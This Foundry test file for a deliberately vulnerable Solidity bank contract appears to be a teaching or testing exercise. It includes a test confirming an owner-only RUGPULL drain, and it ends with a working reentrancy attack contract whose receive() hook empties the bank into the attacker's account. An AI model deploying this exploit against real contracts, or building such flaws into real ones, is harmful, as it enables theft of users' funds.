// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import {Test, console} from "forge-std/Test.sol";

import {unsafeBank} from "../src/bank.sol";

interface IUnsafeBank {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
    function withdrawAll() external;
    function RUGPULL() external;
    function owner() external view returns (address);
    function balances(address addr) external view returns (uint256);
}

contract BankTest is Test {
    unsafeBank internal bank;

    address internal user;
    address internal admin;
    address internal hacker;

    function setUp() public {
        user = makeAddr("user");
        admin = makeAddr("admin");
        hacker = makeAddr("hacker");

        vm.prank(admin);
        bank = new unsafeBank();
    }

    function test_version() public {
        string memory version = bank.VERSION();
        assertEq(version, "1.0");
    }

    function test_owner() public {
        address owner = IUnsafeBank(address(bank)).owner();
        assertEq(owner, admin);
    }

    function test_balances() public {
        uint256 amount = IUnsafeBank(address(bank)).balances(user);
        assertEq(amount, 0);
    }

    event unsafeBank__depositToken(address indexed user, uint256 indexed amount);

    function test_deposit() public {
        deal(user, 5 ether);

        vm.prank(user);
        vm.expectEmit(true, true, true, false);
        emit unsafeBank__depositToken(user, 1 ether);
        IUnsafeBank(address(bank)).deposit{value: 1 ether}();

        uint256 amount = IUnsafeBank(address(bank)).balances(user);
        assertEq(amount, 1 ether);
    }

    function test_receive() public {
        deal(user, 5 ether);

        vm.prank(user);
        vm.expectEmit(true, true, false, false);
        emit unsafeBank__depositToken(user, 1 ether);
        (bool success,) = address(bank).call{value: 1 ether}("");
        require(success, "transfer failed");

        uint256 amount = IUnsafeBank(address(bank)).balances(user);
        assertEq(amount, 1 ether);
    }

    function test_fallback() public {
        deal(user, 5 ether);

        vm.prank(user);
        vm.expectEmit(true, true, false, false);
        emit unsafeBank__depositToken(user, 1 ether);
        (bool success,) = address(bank).call{value: 1 ether}("x");
        require(success, "transfer failed");

        uint256 amount = IUnsafeBank(address(bank)).balances(user);
        assertEq(amount, 1 ether);
    }

    event unsafeBank__withdrawToken(address indexed user, uint256 indexed amount);

    function test_withdraw() public {
        deal(user, 5 ether);

        vm.prank(user);
        vm.expectEmit(true, true, true, false);
        emit unsafeBank__depositToken(user, 5 ether);
        IUnsafeBank(address(bank)).deposit{value: 5 ether}();

        vm.prank(user);
        vm.expectEmit(true, true, false, false);
        emit unsafeBank__withdrawToken(user, 1 ether);
        IUnsafeBank(address(bank)).withdraw(1 ether);

        uint256 amount = IUnsafeBank(address(bank)).balances(user);
        assertEq(amount, 4 ether);
    }

    function test_withdrawAll() public {
        deal(user, 5 ether);

        vm.prank(user);
        vm.expectEmit(true, true, true, false);
        emit unsafeBank__depositToken(user, 5 ether);
        IUnsafeBank(address(bank)).deposit{value: 5 ether}();

        vm.prank(user);
        vm.expectEmit(true, true, false, false);
        emit unsafeBank__withdrawToken(user, 5 ether);
        IUnsafeBank(address(bank)).withdrawAll();

        uint256 amount = IUnsafeBank(address(bank)).balances(user);
        assertEq(amount, 0);
    }

    function test_rugpull() public {
        deal(user, 5 ether);

        vm.prank(user);
        vm.expectEmit(true, true, true, false);
        emit unsafeBank__depositToken(user, 5 ether);
        IUnsafeBank(address(bank)).deposit{value: 5 ether}();

        vm.prank(admin);
        IUnsafeBank(address(bank)).RUGPULL();

        assertEq(user.balance, 0);
        assertEq(admin.balance, 5 ether);
    }

    function test_reentrancy() public {
        deal(user, 10 ether);

        vm.prank(user);
        IUnsafeBank(address(bank)).deposit{value: 10 ether}();

        deal(hacker, 1 ether);
        vm.startPrank(hacker);
        Hack hack = new Hack(bank);
        hack.deposit{value: 1 ether}();
        hack.withdrawAll();
        hack.withdraw();
        vm.stopPrank();

        assertEq(address(bank).balance, 0);
        assertEq(address(hacker).balance, 11 ether);
    }
}

contract Hack {
    address internal owner;
    unsafeBank internal bank;

    constructor(unsafeBank _bank) payable {
        owner = msg.sender;
        bank = _bank;
    }

    function deposit() public payable {
        IUnsafeBank(address(bank)).deposit{value: msg.value}();
    }

    function withdrawAll() public {
        IUnsafeBank(address(bank)).withdrawAll();
    }

    function withdraw() public {
        if (msg.sender != owner) revert();

        (bool success,) = owner.call{value: address(this).balance}("");
        require(success, "Transfer Failed");
    }

    receive() external payable {
        if (address(bank).balance > 0) {
            IUnsafeBank(address(bank)).withdrawAll();
        }
    }
}
